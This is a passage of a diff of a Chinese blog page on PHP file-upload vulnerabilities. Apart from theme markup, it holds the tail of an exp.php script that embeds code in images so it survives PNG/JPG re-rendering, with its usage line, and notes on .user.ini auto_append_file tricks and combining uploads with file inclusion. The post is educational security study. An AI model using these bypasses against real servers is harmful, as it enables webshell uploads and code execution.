language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">用法  php exp.php a.png</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>我们来一个jpg二次渲染绕过的专用图片</p>
-<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209271146879.jpg" alt="jpg_xr" style="zoom:33%;" />
+<img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209271146879.jpg"
+                      alt="jpg_xr" style="zoom:33%;" 
+                >
 
-<h4 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112211613.png" alt="image-20220911221130575"></p>
+<h4 id="配合文件包含"><a href="#配合文件包含" class="headerlink" title="配合文件包含"></a>配合文件包含</h4><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209112211613.png"
+                      alt="image-20220911221130575"
+                ></p>
 <ul>
 <li>文件上传最容易出现代码执行和命令执行，且危害巨大</li>
 <li>配置文件.user.ini中，auto_append_file参数不仅可以写文件名，也可以是伪协议和nginx日志</li>
@@ -136,118 +338,335 @@
 <li>png和jpg二次渲染后，仍可能保留恶意代码</li>
 </ul>
 
-            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
-            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
-                <source type="audio/mpeg" src="">
-            </audio>
+            </div>
+
             
-                <ul id="audio-list" style="display:none">
+
+            
+                <ul class="post-tags-box">
                     
-                        
-                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Web/">#Web</a>&nbsp;
+                        </li>
                     
-                        
-                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Study/">#Study</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/PHP-upload/">#PHP_upload</a>&nbsp;
+                        </li>
                     
                 </ul>
             
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/10/20/web_6/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Web_6_反序列化</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/09/10/web_3/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Web_3_PHP文件包含</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"/>
+        <script data-pjax src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          function loadWaline() {
+            Waline.init({
+              el: '#waline-comment',
+              serverURL: 'https://lsvf4zhg.api.lncldglobal.com',
+              lang: 'en' || 'zh-CN',
+              comment: '.post-comments-count',
+              reaction: 'true' === 'true'
+            })
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              loadWaline()
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadWaline)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">第一节 php文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%BA%E5%88%B6"><span class="nav-text">0x1 php文件上传机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="nav-text">0x2 文件上传的例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95"><span class="nav-text">文件上传表单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="nav-text">文件上传的例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%88%90%E5%9B%A0"><span class="nav-text">文件上传的成因</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-text">0x3 文件上传可能存在的漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="nav-text">文件上传后缀黑名单过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%8400%E6%88%AA%E6%96%AD"><span class="nav-text">php文件上传的00截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#iconv%E5%AD%97%E7%AC%A6%E8%BD%AC%E6%8D%A2%E5%BC%82%E5%B8%B8%E9%80%A0%E6%88%90%E6%88%AA%E6%96%AD"><span class="nav-text">iconv字符转换异常造成截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="nav-text">文件后缀白名单过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">web服务器解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">IIS解析漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">nginx解析漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">Apache解析漏洞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="nav-text">0x4文件上传高级利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-text">配置文件绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">.htaccess配置文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">.user.ini配置文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="nav-text">文件内容检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8EXSS"><span class="nav-text">文件上传与XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0"><span class="nav-text">图片上传</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#getimagesize%E7%BB%95%E8%BF%87"><span class="nav-text">getimagesize绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#png%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="nav-text">png二次渲染绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="nav-text">jpg二次渲染绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-text">配合文件包含</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2022.04.28</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Charmersix</a>
+            
         </div>
         
-    <div id="gitalk-container" class="comment link"
-		data-enable="true"
-        data-ae="false"
-        data-ci="f71ceda7a670da0dc3de"
-        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
-        data-r="blog_comments"
-        data-o="Charmersix"
-        data-a="Charmersix"
-        data-d="false"
-    >查看评论</div>
-
-
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
     </div>
+</footer>
+
+        </div>
+    </div>
+
     
-        <div class="side">
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.</span> <span class="toc-text">第一节 php文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 php文件上传机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 文件上传的例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95"><span class="toc-number">1.2.1.</span> <span class="toc-text">文件上传表单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">文件上传的例子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.3.</span> <span class="toc-text">文件上传的成因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 文件上传可能存在的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">文件上传后缀黑名单过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%8400%E6%88%AA%E6%96%AD"><span class="toc-number">1.3.2.</span> <span class="toc-text">php文件上传的00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iconv%E5%AD%97%E7%AC%A6%E8%BD%AC%E6%8D%A2%E5%BC%82%E5%B8%B8%E9%80%A0%E6%88%90%E6%88%AA%E6%96%AD"><span class="toc-number">1.3.3.</span> <span class="toc-text">iconv字符转换异常造成截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.4.</span> <span class="toc-text">文件后缀白名单过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">web服务器解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.4.1.1.</span> <span class="toc-text">IIS解析漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.4.1.2.</span> <span class="toc-text">nginx解析漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.4.1.3.</span> <span class="toc-text">Apache解析漏洞</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x4文件上传高级利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">配置文件绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#htaccess%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">.htaccess配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">.user.ini配置文件</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.2.</span> <span class="toc-text">文件内容检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8EXSS"><span class="toc-number">1.4.3.</span> <span class="toc-text">文件上传与XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.4.4.</span> <span class="toc-text">图片上传</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#getimagesize%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">getimagesize绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#png%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">png二次渲染绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#jpg%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.3.</span> <span class="toc-text">jpg二次渲染绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.5.</span> <span class="toc-text">配合文件包含</span></a></li></ol></li></ol></li></ol>	
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
         </div>
     
-</div>
 
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
 
     </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
 </body>
-
-<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
